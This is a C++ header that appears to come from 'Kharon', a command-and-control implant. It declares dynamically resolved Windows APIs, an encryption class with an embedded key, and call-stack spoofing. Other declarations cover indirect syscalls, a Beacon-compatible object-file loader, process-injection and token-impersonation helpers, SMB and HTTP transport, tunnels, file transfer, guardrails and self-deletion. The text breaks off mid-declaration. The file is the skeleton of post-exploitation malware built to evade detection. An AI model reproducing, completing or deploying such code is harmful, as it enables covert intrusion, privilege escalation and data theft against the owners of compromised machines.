            UPTR Handle;

            DECLAPI( VariantClear );
            DECLAPI( VariantInit );
            DECLAPI( SafeArrayGetDim );
            DECLAPI( SafeArrayAccessData );
            DECLAPI( SafeArrayGetLBound );
            DECLAPI( SafeArrayGetUBound );
            DECLAPI( SafeArrayCreateVector );
            DECLAPI( SafeArrayCreate );
            DECLAPI( SysFreeString );
            DECLAPI( SysAllocString );
            DECLAPI( SafeArrayPutElement );
            DECLAPI( SafeArrayDestroy );
        } Oleaut32 = {
            RSL_TYPE( VariantClear ),
            RSL_TYPE( VariantInit ),
            RSL_TYPE( SafeArrayGetDim ),
            RSL_TYPE( SafeArrayAccessData ),
            RSL_TYPE( SafeArrayGetLBound ),
            RSL_TYPE( SafeArrayGetUBound ),
            RSL_TYPE( SafeArrayCreateVector ),
            RSL_TYPE( SafeArrayCreate ),
            RSL_TYPE( SysFreeString ),
            RSL_TYPE( SysAllocString ),
            RSL_TYPE( SafeArrayPutElement ),
            RSL_TYPE( SafeArrayDestroy ),
        };

        struct {
            UPTR Handle;

            DECLAPI( AllocateAndInitializeSid );
            DECLAPI( SetEntriesInAclA );
            DECLAPI( InitializeSecurityDescriptor );
            DECLAPI( SetSecurityDescriptorSacl );
            DECLAPI( SetSecurityDescriptorDacl );
            DECLAPI( ImpersonateLoggedOnUser );
            DECLAPI( RevertToSelf );

            DECLAPI( LookupAccountSidW );
            DECLAPI( LookupAccountSidA );
            DECLAPI( LookupPrivilegeValueA );
            DECLAPI( LookupPrivilegeNameA );
            DECLAPI( AdjustTokenPrivileges );
            DECLAPI( OpenProcessToken );
            DECLAPI( OpenThreadToken );
            DECLAPI( GetTokenInformation );
            DECLAPI( DuplicateTokenEx );
            DECLAPI( LogonUserA );

            DECLAPI( GetUserNameA );

            DECLAPI( RegOpenKeyExA    );
            DECLAPI( RegQueryValueExA );
            DECLAPI( RegCloseKey      );
        } Advapi32 = {
            RSL_TYPE( AllocateAndInitializeSid ),
            RSL_TYPE( SetEntriesInAclA ),
            RSL_TYPE( InitializeSecurityDescriptor ),
            RSL_TYPE( SetSecurityDescriptorSacl ),
            RSL_TYPE( SetSecurityDescriptorDacl ),
            RSL_TYPE( ImpersonateLoggedOnUser ),
            RSL_TYPE( RevertToSelf ),

            RSL_TYPE( LookupAccountSidW ),
            RSL_TYPE( LookupAccountSidA ),
            RSL_TYPE( LookupPrivilegeValueA ),
            RSL_TYPE( LookupPrivilegeNameA ),
            RSL_TYPE( AdjustTokenPrivileges ),
            RSL_TYPE( OpenProcessToken ),
            RSL_TYPE( OpenThreadToken ),
            RSL_TYPE( GetTokenInformation ),
            RSL_TYPE( DuplicateTokenEx ),
            RSL_TYPE( LogonUserA ),

            RSL_TYPE( GetUserNameA ),

            RSL_TYPE( RegOpenKeyExA    ),
            RSL_TYPE( RegQueryValueExA ),
            RSL_TYPE( RegCloseKey      ),
        };

        struct {
            UPTR Handle;

            DECLAPI( SystemFunction040 );
            DECLAPI( SystemFunction041 );
        } Cryptbase = {
            RSL_TYPE( SystemFunction040 ),
            RSL_TYPE( SystemFunction041 ),
        };

        struct {
            UPTR Handle;

            DECLAPI( CLRCreateInstance );
            DECLAPI( LoadLibraryShim );
        } Mscoree = {
            RSL_TYPE( CLRCreateInstance ),
            RSL_TYPE( LoadLibraryShim ),
        };

        struct {
            UPTR Handle;
    
            DECLAPI( InternetOpenW       );
            DECLAPI( InternetConnectW    );
            DECLAPI( HttpOpenRequestW    );
	        DECLAPI( HttpAddRequestHeadersW );
            DECLAPI( InternetSetOptionW  );
            DECLAPI( InternetSetCookieW  );
            DECLAPI( HttpSendRequestW    );
            DECLAPI( HttpQueryInfoW      );
            DECLAPI( InternetReadFile    );
            DECLAPI( InternetCloseHandle );
        } Wininet = {
            RSL_TYPE( InternetOpenW       ),
            RSL_TYPE( InternetConnectW    ),
            RSL_TYPE( HttpOpenRequestW    ),
	        RSL_TYPE( HttpAddRequestHeadersW ),
            RSL_TYPE( InternetSetOptionW  ),
            RSL_TYPE( InternetSetCookieW  ),
            RSL_TYPE( HttpSendRequestW    ),
            RSL_TYPE( HttpQueryInfoW      ),
            RSL_TYPE( InternetReadFile    ),
            RSL_TYPE( InternetCloseHandle ),
        };

        explicit Kharon();

        auto Init(
            VOID
        ) -> VOID;

        auto Start(
            _In_ UPTR Argument
        ) -> VOID;

        VOID InitInject( Injection* InjRf ) { Inj = InjRf; }
        VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
        VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
        VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
        VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
        VOID InitSocket( Socket* SocketRf ) { Skt = SocketRf; }
        VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
        VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
        VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
        VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
        VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
        VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
        VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
        VOID InitTask( Task* TaskRf ) { Tsk = TaskRf; }
        VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
        VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
        VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
        VOID InitMask( Mask* MaskRf ) { Mk = MaskRf; }
        VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
    };
}

typedef struct {
    ULONG SymHash;
    PVOID SymPtr;
} COFF_API, *PCOFF_API;

typedef struct {
	PCHAR original;
	PCHAR buffer; 
	INT   length;  
	INT   size;     
} DATAP;

typedef struct {
	PCHAR original; 
	PCHAR buffer;   
	INT   length;   
	INT   size;     
} FMTP;

struct _LOAD_CTX {
    UPTR LoadLibraryAPtr;
    UPTR LibraryName;
};

struct _CLR_CTX {
    UPTR CLRCreateInstancePtr;
    UPTR Arg1;
    UPTR Arg2;
    UPTR Arg3;
};

typedef _CLR_CTX CLR_CTX;
typedef _LOAD_CTX LOAD_CTX;

enum _LOKY_CRYPT {
    LokyEnc,
    LokyDec
};
typedef _LOKY_CRYPT LOKY_CRYPT;

#define BLOCK_SIZE 8
#define NUM_ROUNDS 16

class Crypt {
private:
    Root::Kharon* Self;    
public:
    Crypt( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    UCHAR LokKey[16] = KH_CRYPT_KEY;
    UCHAR XorKey[16] = KH_CRYPT_KEY;

    auto CalcPadding(
        ULONG Length
    ) -> ULONG;

    auto Cycle( 
        BYTE* Block, 
        LOKY_CRYPT Loky 
    ) -> VOID;

    auto AddPadding(
        PBYTE Block,
        ULONG Length,
        ULONG TotalSize
    ) -> VOID;

    auto RmPadding(
        PBYTE  Block,
        ULONG &Length
    ) -> VOID;

    auto Encrypt(
        PBYTE Block,
        ULONG Length
    ) -> VOID;

    auto Decrypt(
        PBYTE Block,
        ULONG &Length
    ) -> VOID;

    auto Xor( 
        _In_opt_ BYTE*  Bin, 
        _In_     SIZE_T BinSize
    ) -> VOID;
};

struct _FRAME_INFO {
    UPTR Ptr;  // pointer to function + offset
    UPTR Size; // stack size
};
typedef _FRAME_INFO FRAME_INFO;

struct _GADGET_INFO {
    UPTR Ptr;  // pointer to gadget
    UPTR Size; // stack size
};
typedef _GADGET_INFO GADGET_INFO;

class Spoof {
private:
    Root::Kharon* Self;    
public:
    Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    struct {
        FRAME_INFO First;   // 0x00  // RtlUserThreadStart+0x21
        FRAME_INFO Second;  // 0x10  // BaseThreadInitThunk+0x14
        FRAME_INFO Gadget;  // 0x20  // rbp gadget
        
        UPTR Restore;      // 0x30
        UPTR Ssn;          // 0x38
        UPTR Ret;          // 0x40
        
        UPTR Rbx;          // 0x48
        UPTR Rdi;          // 0x50
        UPTR Rsi;          // 0x58
        UPTR R12;          // 0x60
        UPTR R13;          // 0x68
        UPTR R14;          // 0x70
        UPTR R15;          // 0x78

        UPTR ArgCount;     // 0x80
    } Setup = {
        .First { 
            .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
        },
        .Second {
            .Ptr = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x14,
        },
    };

    auto Call( 
        _In_ UPTR Fnc, 
        _In_ UPTR Ssn,
        _In_ UPTR Arg1  = 0,
        _In_ UPTR Arg2  = 0,
        _In_ UPTR Arg3  = 0,
        _In_ UPTR Arg4  = 0,
        _In_ UPTR Arg5  = 0, 
        _In_ UPTR Arg6  = 0,
        _In_ UPTR Arg7  = 0,
        _In_ UPTR Arg8  = 0,
        _In_ UPTR Arg9  = 0,
        _In_ UPTR Arg10 = 0,
        _In_ UPTR Arg11 = 0,
        _In_ UPTR Arg12 = 0
    ) -> UPTR;

    auto StackSizeWrapper(
        _In_ UPTR RetAddress
    ) -> UPTR;

    auto StackSize(
        _In_ UPTR RtmFunction,
        _In_ UPTR ImgBase
    ) -> UPTR;
};

struct _BOF_OBJ {
    PVOID MmBegin;
    PVOID MmEnd;
    CHAR* UUID;
    ULONG CmdID;

    struct _BOF_OBJ* Next;
};
typedef _BOF_OBJ BOF_OBJ;

struct _DATA_STORE {
    INT32  Type;
    UINT64 Hash;
    BOOL   Masked;
    CHAR*  Buffer;
    SIZE_T Length;
};
typedef _DATA_STORE DATA_STORE;

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1
#define DATA_STORE_TYPE_DOTNET       2
#define DATA_STORE_TYPE_PE           3
#define DATA_STORE_TYPE_BOF          4

struct _USER_DATA {
    CHAR*  Key;
    PVOID  Ptr;
    struct _USER_DATA* Next;
};
typedef _USER_DATA VALUE_DICT;

class Coff {
public:
    Root::Kharon* Self;   

    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}

    PPACKAGE Pkg = { 0 };

    VALUE_DICT* UserData  = nullptr;
    BOF_OBJ*    Node      = nullptr;
    ULONG       ObjCount  = 0;

    // hooks call from bof table
    struct {
        UPTR Hash;
        UPTR Ptr;
    } HookTable[16] = {
        HookTable[0]  = { Hsh::Str( "VirtualAlloc" ),       (UPTR)Self->Cf->VirtualAlloc },
        HookTable[1]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)Self->Cf->VirtualAllocEx },
        HookTable[2]  = { Hsh::Str( "WriteProcessMemory" ), (UPTR)Self->Cf->WriteProcessMemory },
        HookTable[3]  = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)Self->Cf->ReadProcessMemory },
        HookTable[4]  = { Hsh::Str( "LoadLibraryA" ),       (UPTR)Self->Cf->LoadLibraryA },
        HookTable[5]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)Self->Cf->VirtualProtect },
        HookTable[6]  = { Hsh::Str( "VirtualAllocEx" ),     (UPTR)Self->Cf->VirtualAllocEx },
        HookTable[7]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)Self->Cf->VirtualProtectEx },
        HookTable[8]  = { Hsh::Str( "NtSetContextThread" ), (UPTR)Self->Cf->SetThreadContext },
        HookTable[9]  = { Hsh::Str( "SetThreadContext" ),   (UPTR)Self->Cf->SetThreadContext },
        HookTable[10] = { Hsh::Str( "NtGetContextThread" ), (UPTR)Self->Cf->GetThreadContext },
        HookTable[11] = { Hsh::Str( "GetThreadContext" ),   (UPTR)Self->Cf->GetThreadContext },
        HookTable[12] = { Hsh::Str( "CLRCreateInstance" ),  (UPTR)Self->Cf->CLRCreateInstance },
        HookTable[13] = { Hsh::Str( "CoInitialize" ),       (UPTR)Self->Cf->CoInitialize },
        HookTable[14] = { Hsh::Str( "CoInitializeEx" ),     (UPTR)Self->Cf->CoInitializeEx },
        HookTable[15] = { Hsh::Str( "LoadLibraryW" ),       (UPTR)Self->Cf->LoadLibraryW },
    };

    struct {
        UPTR  Hash;
        PVOID Ptr;
    } ApiTable[30] = {        
        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),              reinterpret_cast<PVOID>(&Coff::DataParse) },
        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),                reinterpret_cast<PVOID>(&Coff::DataInt) },
        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),            reinterpret_cast<PVOID>(&Coff::DataExtract) },
        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),              reinterpret_cast<PVOID>(&Coff::DataShort) },
        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),             reinterpret_cast<PVOID>(&Coff::DataLength) },
        ApiTable[5]  = { Hsh::Str("BeaconOutput"),                 reinterpret_cast<PVOID>(&Coff::Output) },
        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),                 reinterpret_cast<PVOID>(&Coff::Printf) },
        ApiTable[7]  = { Hsh::Str("BeaconAddValue"),               reinterpret_cast<PVOID>(&Coff::AddValue) },
        ApiTable[8]  = { Hsh::Str("BeaconGetValue"),               reinterpret_cast<PVOID>(&Coff::GetValue) },
        ApiTable[9]  = { Hsh::Str("BeaconRemoveValue"),            reinterpret_cast<PVOID>(&Coff::RmValue) },
        ApiTable[10] = { Hsh::Str("BeaconVirtualAlloc"),           reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
        ApiTable[11] = { Hsh::Str("BeaconVirtualProtect"),         reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
        ApiTable[12] = { Hsh::Str("BeaconVirtualAllocEx"),         reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
        ApiTable[13] = { Hsh::Str("BeaconVirtualProtectEx"),       reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
        ApiTable[14] = { Hsh::Str("BeaconIsAdmin"),                reinterpret_cast<PVOID>(&Coff::IsAdmin) },
        ApiTable[15] = { Hsh::Str("BeaconUseToken"),               reinterpret_cast<PVOID>(&Coff::UseToken) },
        ApiTable[15] = { Hsh::Str("BeaconRevertToken"),            reinterpret_cast<PVOID>(&Coff::RevertToken) },
        ApiTable[16] = { Hsh::Str("BeaconOpenProcess"),            reinterpret_cast<PVOID>(&Coff::OpenProcess) },
        ApiTable[17] = { Hsh::Str("BeaconOpenThread"),             reinterpret_cast<PVOID>(&Coff::OpenThread) },
        ApiTable[18] = { Hsh::Str("BeaconFormatAlloc"),            reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
        ApiTable[19] = { Hsh::Str("BeaconFormatAppend"),           reinterpret_cast<PVOID>(&Coff::FmtAppend) },
        ApiTable[20] = { Hsh::Str("BeaconFormatFree"),             reinterpret_cast<PVOID>(&Coff::FmtFree) },
        ApiTable[21] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtInt) },
        ApiTable[22] = { Hsh::Str("BeaconFormatPrintf"),           reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
        ApiTable[23] = { Hsh::Str("BeaconFormatReset"),            reinterpret_cast<PVOID>(&Coff::FmtReset) },
        ApiTable[24] = { Hsh::Str("BeaconFormatToString"),         reinterpret_cast<PVOID>(&Coff::FmtToString) },
        ApiTable[25] = { Hsh::Str("BeaconWriteAPC"),               reinterpret_cast<PVOID>(&Coff::WriteApc) },
        ApiTable[26] = { Hsh::Str("BeaconDripAlloc"),              reinterpret_cast<PVOID>(&Coff::DriAlloc) },
        ApiTable[27] = { Hsh::Str("BeaconGetSpawnTo"),             reinterpret_cast<PVOID>(&Coff::GetSpawn) },
    };

    auto Add(
        PVOID MmBegin,
        PVOID MmEnd,
        CHAR* UUID,
        ULONG CmdID
    ) -> BOF_OBJ*;

    auto GetTask(
        PVOID Address
    ) -> CHAR*;

    auto GetCmdID(
        PVOID Address
    ) -> ULONG;

    auto Rm(
        BOF_OBJ* Obj
    ) -> BOOL;

    inline auto RslRel(
        _In_ PVOID  Base,
        _In_ PVOID  Rel,
        _In_ UINT16 Type
    ) -> VOID;

    auto RslApi(
        _In_ PCHAR SymName
    ) -> PVOID;

    auto Loader(
        _In_ BYTE* Buffer,
        _In_ ULONG Size,
        _In_ BYTE* Args,
        _In_ ULONG Argc,
        _In_ CHAR* UUID,
        _In_ ULONG CmdID
    ) -> BOOL;

    static auto DataExtract(
        DATAP* parser,
        PINT   size
    ) -> PCHAR;

    static auto DataInt(
        DATAP* parser
    ) -> INT;

    static auto DataLength(
        DATAP* parser
    ) -> INT;

    static auto DataShort(
        DATAP* parser
    ) -> SHORT;

    static auto DataParse(
        DATAP* parser,
        PCHAR  buffer,
        INT    size
    ) -> VOID;

    static auto FmtAlloc(
        FMTP* fmt,
        INT   maxsz
    ) -> VOID;

    static auto FmtAppend(
        FMTP* Fmt,
        CHAR* Data,
        INT32 Len
    ) -> VOID;

    static auto FmtFree(
        FMTP* fmt
    ) -> VOID;

    static auto FmtInt(
        FMTP* fmt,
        INT32 val
    ) -> VOID;

    static auto FmtPrintf(
        FMTP* Fmt,
        CHAR* Data,
        ...
    ) -> VOID;

    static auto FmtReset(
        FMTP* fmt
    ) -> VOID;

    static auto FmtToString(
        FMTP* fmt,
        PINT  size
    ) -> PCHAR;

    static auto IsAdmin(
        VOID
    ) -> BOOL;

    static auto UseToken(
        HANDLE token
    ) -> BOOL;

    static auto RevertToken(
        VOID
    ) -> VOID;

    static auto GetSpawn(
        BOOL  x86, 
        PCHAR buffer,
        INT   length
    ) -> VOID;

    static auto SpawnTmpProcess(
        BOOL x86, 
        BOOL ignoreToken, 
        STARTUPINFO si, 
        PPROCESS_INFORMATION pInfo
    ) -> BOOL;

    static auto CleanupProcess(
        PPROCESS_INFORMATION pinfo
    ) -> VOID;

    static auto DataStoreGetItem(
        SIZE_T Index
    ) -> DATA_STORE*;

    static auto DataStoreProtectItem(
        SIZE_T Index
    ) -> VOID;

    static auto DataStoreUnprotectItem(
        SIZE_T Index
    ) -> VOID;

    static auto DataStoreMaxEntries(
        VOID
    ) -> SIZE_T;

    // static auto Information(
    //     PBEACON_INFO Info
    // ) -> VOID;

    static auto DriAlloc(
        SIZE_T Size, 
        ULONG  Protect, 
        HANDLE Handle
    ) -> PVOID;

    static auto WriteApc(
        HANDLE Handle, 
        PVOID  Base, 
        BYTE  *Buffer, 
        ULONG  Size
    ) -> BOOL;

    

    static auto AddValue(
        PCCH  key, 
        PVOID ptr
    ) -> BOOL;

    static auto GetValue(
        PCCH key
    ) -> PVOID;

    static auto RmValue(
        PCCH key
    ) -> BOOL;

    static auto Printf(
        INT  type,
        PCCH Fmt,
        ...
    ) -> VOID;

    static auto Output(
        INT  type,
        PCCH data,
        INT  len
    ) -> VOID;

    static auto ReadProcessMemory(
        HANDLE hProcess, 
        PVOID  BaseAddress, 
        PVOID  Buffer, 
        SIZE_T Size, 
        SIZE_T *Read
    ) -> BOOL;

    static auto WriteProcessMemory(
        HANDLE  hProcess, 
        PVOID   BaseAddress, 
        PVOID   Buffer, 
        SIZE_T  Size, 
        SIZE_T* Written
    ) -> BOOL;

    static auto VirtualAlloc(
        PVOID  Address, 
        SIZE_T Size, 
        DWORD  AllocType, 
        DWORD  Protect
    ) -> PVOID; 

    static auto VirtualAllocEx(
        HANDLE Handle,
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  AllocType, 
        DWORD  Protect
    ) -> PVOID; 

    static auto VirtualProtect(
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  NewProtect, 
        PDWORD OldProtect
    ) -> BOOL;

    static auto VirtualProtectEx(
        HANDLE Handle,
        LPVOID Address, 
        SIZE_T Size, 
        DWORD  NewProtect, 
        PDWORD OldProtect
    ) -> BOOL;
    
    static auto OpenProcess(
        DWORD desiredAccess, 
        BOOL  inheritHandle, 
        DWORD processId
    ) -> HANDLE;

    static auto OpenThread(
        DWORD desiredAccess, 
        BOOL  inheritHandle, 
        DWORD threadId
    ) -> HANDLE;

    static auto LoadLibraryA(
        CHAR* LibraryName
    ) -> HMODULE;

    static auto LoadLibraryW(
        WCHAR* LibraryName
    ) -> HMODULE;

    static auto CLRCreateInstance(
        REFCLSID clsid, REFIID riid, LPVOID *ppInterface
    ) -> HRESULT;

    static auto CoInitialize(
        LPVOID pvReserved
    ) -> HRESULT;

    static auto CoInitializeEx(
        LPVOID pvReserved,
        DWORD  dwCoInit
    ) -> HRESULT;    

    static auto GetThreadContext(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL;

    static auto SetThreadContext(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL; 
};

class Syscall {
private:
    Root::Kharon* Self;    
public:
    Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    INT8 Index;

    struct {
        ULONG ssn;
        ULONG Hash;
        UPTR  Address;
        UPTR  Instruction;
    } Ext[Sys::Last] = {};

    auto Fetch(
        _In_ INT8 SysIdx
    ) -> BOOL;
};

class Jobs {
private:
    Root::Kharon* Self;
public:
    Jobs( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PACKAGE* PostJobs = nullptr;

    ULONG Count = 0;
    JOBS* List  = nullptr;

    CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
    CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";

    CHAR* CurrentUUID  = nullptr;
    ULONG CurrentCmdId = 0;
    ULONG CurrentSubId = 0;

    auto Create(
        _In_ CHAR*   UUID, 
        _In_ PARSER* Parser,
        _In_ BOOL    IsResponse = FALSE
    ) -> JOBS*;
    
    auto Send( 
        _In_ PACKAGE* PostJobs 
    ) -> VOID;

    auto GetAll(
        VOID
    ) -> VOID;

    auto ExecuteAll( VOID ) -> LONG;
    
    auto static Execute(
        _In_ JOBS* Job
    ) -> ERROR_CODE;
    
    auto GetByUUID(
        _In_ CHAR* UUID
    ) -> JOBS*;
    
    auto GetByID(
        _In_ ULONG ID
    ) -> JOBS*;

    auto Cleanup( VOID ) -> VOID;
    
    auto Remove(
        _In_ JOBS* Job
    ) -> BOOL;
};

class Useful {
private:
    Root::Kharon* Self;
public:
    Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto ValidGranMem( HANDLE ProcessHandle, ULONG GranCount ) -> PVOID;

    auto CfgAddrAdd( 
        _In_ PVOID ImageBase,
        _In_ PVOID Function
    ) -> VOID;

    auto CfgPrivAdd(
        _In_ HANDLE hProcess,
        _In_ PVOID  Address,
        _In_ DWORD  Size
    ) -> VOID;

    auto CfgCheck( VOID ) -> BOOL;

    auto Guardrails( VOID ) -> BOOL;
    auto CheckWorktime( VOID ) -> BOOL;

    auto FindGadget(
        _In_ UPTR   ModuleBase,
        _In_ UINT16 RegValue
    ) -> UPTR;

    auto SecVa(
        _In_ UPTR LibBase,
        _In_ UPTR SecHash
    ) -> ULONG;

    auto SecSize(
        _In_ UPTR LibBase,
        _In_ UPTR SecHash
    ) -> ULONG;

    auto NtStatusToError(
        _In_ NTSTATUS NtStatus
    ) -> ERROR_CODE;

    auto SelfDelete( VOID ) -> BOOL;
    
    auto CheckKillDate( VOID ) -> VOID;

    auto FixRel(
        _In_ PVOID Base,
        _In_ UPTR  Delta,
        _In_ IMAGE_DATA_DIRECTORY* DataDir
    ) -> VOID;

    auto FixExp(
        _In_ PVOID Base,
        _In_ IMAGE_DATA_DIRECTORY* DataDir
    ) -> VOID;

    auto FixTls(
        _In_ PVOID Base,
        _In_ IMAGE_DATA_DIRECTORY* DataDir
    ) -> VOID;

    auto FixImp(
        _In_ PVOID Base,
        _In_ IMAGE_DATA_DIRECTORY* DataDir
    ) -> BOOL;
};

class Package {
private:
    Root::Kharon* Self;

public:
    Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PPACKAGE Shared = nullptr;

    auto Base64(
        _In_      const PVOID in,
        _In_      SIZE_T inlen,
        _Out_opt_ PVOID  out,
        _In_opt_  SIZE_T outlen,
        _In_      Base64Action Action 
    ) -> SIZE_T;

    auto SendOut(
        _In_ ULONG Type,
        _In_ ULONG CmdID,
        _In_ BYTE* Buffer,
        _In_ INT32 Length
    ) -> BOOL;

    auto FmtMsg(
        _In_ ULONG Type,
        _In_ CHAR* Message,
        ...    
    ) -> BOOL;
    
    auto SendMsg(
        _In_ ULONG Type,
        _In_ CHAR* Message
    ) -> BOOL;

    auto Int16( 
        _In_ PPACKAGE Package, 
        _In_ INT16    dataInt 
    ) -> VOID;

    auto Int32( 
        _In_ PPACKAGE Package, 
        _In_ INT32    dataInt
    ) -> VOID;

    auto Int64( 
        _In_ PPACKAGE Package, 
        _In_ INT64    dataInt 
    ) -> VOID;

    auto Pad( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto Bytes( 
        _In_ PPACKAGE Package, 
        _In_ PUCHAR   Data, 
        _In_ SIZE_T   Size 
    ) -> VOID;

    auto Byte( 
        _In_ PPACKAGE Package, 
        _In_ BYTE     dataInt 
    ) -> VOID;

    auto Create( 
        _In_ ULONG CommandID,
        _In_ PCHAR UUID
    ) -> PPACKAGE;

    auto PostJobs(
        VOID
    ) -> PPACKAGE;

    auto NewTask( 
        VOID
    ) -> PPACKAGE;

    auto Checkin(
        VOID
    ) -> PPACKAGE;

    auto Destroy( 
        _In_ PPACKAGE Package 
    ) -> VOID;

    auto Transmit( 
        _In_  PPACKAGE Package, 
        _Out_ PVOID*   Response, 
        _Out_ PUINT64  Size 
    ) -> BOOL;

    auto Error(
        _In_ ULONG ErrorCode
    ) -> VOID;

    auto Str( 
        _In_ PPACKAGE package, 
        _In_ PCHAR    data 
    ) -> VOID;

    auto Wstr( 
        _In_ PPACKAGE package, 
        _In_ PWCHAR   data 
    ) -> VOID;
};

class Parser {
private:
    Root::Kharon* Self;
public:
    Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL    Endian = FALSE;
    PPARSER Shared = nullptr;

    auto NewTask( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto New( 
        _In_ PPARSER parser, 
        _In_ PVOID   Buffer, 
        _In_ UINT64  size 
    ) -> VOID;

    auto Pad(
        _In_  PPARSER parser,
        _Out_ ULONG size
    ) -> BYTE*;

    auto Byte(
        _In_ PPARSER Parser
    ) -> BYTE;

    auto Int16(
        _In_ PPARSER Parser
    ) -> INT16;

    auto Int32(
        _In_ PPARSER Parser
    ) -> INT32;

    auto Int64(
        _In_ PPARSER Parser
    ) -> INT64;

    auto Bytes(
        _In_  PPARSER parser,
        _Out_ ULONG*  size
    ) -> BYTE*;

    auto Str( 
        _In_ PPARSER parser, 
        _In_ ULONG*  size 
    ) -> PCHAR;

    auto Wstr(
        _In_ PPARSER parser, 
        _In_ ULONG*  size 
    ) -> PWCHAR;

    auto Destroy(
        _In_ PPARSER Parser 
    ) -> BOOL;   
};

class Transport {    
private:
    Root::Kharon* Self;
public:
    Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    struct {
        CHAR*  FileID;
        BYTE*  BytesReceived;
        ULONG  ChunkSize;
        ULONG  CurChunk;
        ULONG  TotalChunks;
        CHAR*  Path;
        HANDLE FileHandle;
    } Up[30];
    
    struct {
        CHAR*  FileID;
        ULONG  ChunkSize;
        ULONG  CurChunk;
        ULONG  TotalChunks;
        CHAR*  Path;
        HANDLE FileHandle;
    } Down[30];

    struct {
        ULONG ChannelID;
        CHAR* Host;
        ULONG Port;
        CHAR* Username;
        CHAR* Password;
        SOCKET Socket;
        BYTE   state;
	    BYTE   mode;
        ULONG  startTick;
        ULONG  waitTime;
        ULONG  closeTimer;

    } Tunnels[30];

    ULONG numDownloadTasks = 0;
    ULONG numTunnelTasks = 0;
    ULONG ChunckSize;

    struct {
        PVOID  Node;
#if PROFILE_C2 == PROFILE_SMB
        PCHAR  Name;
        HANDLE Handle;
#endif
    } Pipe = {
        .Node = nullptr,
#if PROFILE_C2 == PROFILE_SMB
        .Name = SMB_PIPE_NAME
#endif
    };

    auto SmbAdd(
        _In_ CHAR* NamedPipe,
        _In_ PVOID Parser,
        _In_ PVOID Package
    ) -> PVOID;

    auto SmbRm(
        _In_ PVOID SmbData
    ) -> BOOL;

    auto SmbGet(
        _In_ CHAR* SmbUUID
    ) -> PVOID;

    auto SmbList(
        VOID
    ) -> PVOID;

    auto Checkin(
        VOID
    ) -> BOOL;

    auto Send(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;

    auto SmbSend(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;

    auto WebSend(
        _In_      PVOID   Data,
        _In_      UINT64  Size,
        _Out_opt_ PVOID  *RecvData,
        _Out_opt_ UINT64 *RecvSize
    ) -> BOOL;
};

typedef struct _SOCKET_CTX {
    ULONG  ServerID;
    SOCKET Socket;

    struct _SOCKET_CTX* Next;
} SOCKET_CTX, *PSOCKET_CTX;

class Socket {
private:
    Root::Kharon* Self;
public:
    Socket( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL        Initialized = FALSE;
    ULONG       Count = 0;
    PSOCKET_CTX Ctx   = nullptr;

    auto Exist( 
        _In_ ULONG ServerID 
    ) -> BOOL;

    auto DECLFN ParseHeader(
        BYTE* data,
        ULONG dataLen,
        ULONG& headerSize,
        ULONG& targetIP,
        USHORT& targetPort
    ) -> BOOL;

    auto Add(
        _In_ ULONG  ServerID,
        _In_ SOCKET Socket
    ) -> ERROR_CODE;

    auto Get(
        _In_ ULONG  ServerID
    ) -> SOCKET;

    auto RmCtx(
        _In_ ULONG ServerID
